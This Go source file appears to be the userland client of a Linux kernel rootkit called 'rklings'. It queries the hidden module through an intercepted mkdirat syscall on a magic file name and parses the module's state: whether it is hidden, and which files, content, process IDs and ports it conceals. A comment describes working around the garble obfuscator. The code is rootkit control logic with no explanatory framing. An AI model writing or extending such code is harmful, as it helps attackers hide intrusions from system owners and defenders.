package main

import (
	"bufio"
	"bytes"
	"fmt"
	"os"
	"runtime"
	"strings"
	"unsafe"

	"golang.org/x/sys/unix"
)

type kernelState struct {
	moduleHidden bool
	targets      map[string][]string
}

func readKernelState() (kernelState, error) {
	state := kernelState{targets: map[string][]string{
		"file": {}, "content": {}, "pid": {}, "port": {},
	}}

	buffer := make([]byte, 12288)
	copy(buffer, "rklings.info")
	// ponytail: ^uintptr(99) == -100 == AT_FDCWD; avoids garble constant-folding -100 into uintptr
	length, _, errno := unix.Syscall(unix.SYS_MKDIRAT,
		^uintptr(99), uintptr(unsafe.Pointer(&buffer[0])), 0)
	runtime.KeepAlive(buffer)
	// When intercepted, the kretprobe returns data length (positive)
	// and writes state into the buffer. Without the module, mkdir
	// returns 0 on success or a negative errno, and a real directory
	// may be created. Clean up and report not loaded.
	if errno != 0 || length == 0 {
		os.Remove("rklings.info")
		if errno != 0 {
			return state, fmt.Errorf("module not loaded: %w", errno)
		}
		return state, fmt.Errorf("module not loaded")
	}
	if length >= uintptr(len(buffer)) {
		return state, fmt.Errorf("query kernel state: invalid response length %d",
			length)
	}

	scanner := bufio.NewScanner(bytes.NewReader(buffer[:length]))
	for scanner.Scan() {
		key, value, ok := strings.Cut(scanner.Text(), "=")
		if !ok {
			continue
		}
		if key == "module_hidden" {
			state.moduleHidden = value == "1"
			continue
		}
		if _, ok := state.targets[key]; ok && value != "" {
			state.targets[key] = append(state.targets[key], value)
		}
	}
	if err := scanner.Err(); err != nil {
		return state, fmt.Errorf("read kernel state: %w", err)
	}
	return state, nil
}
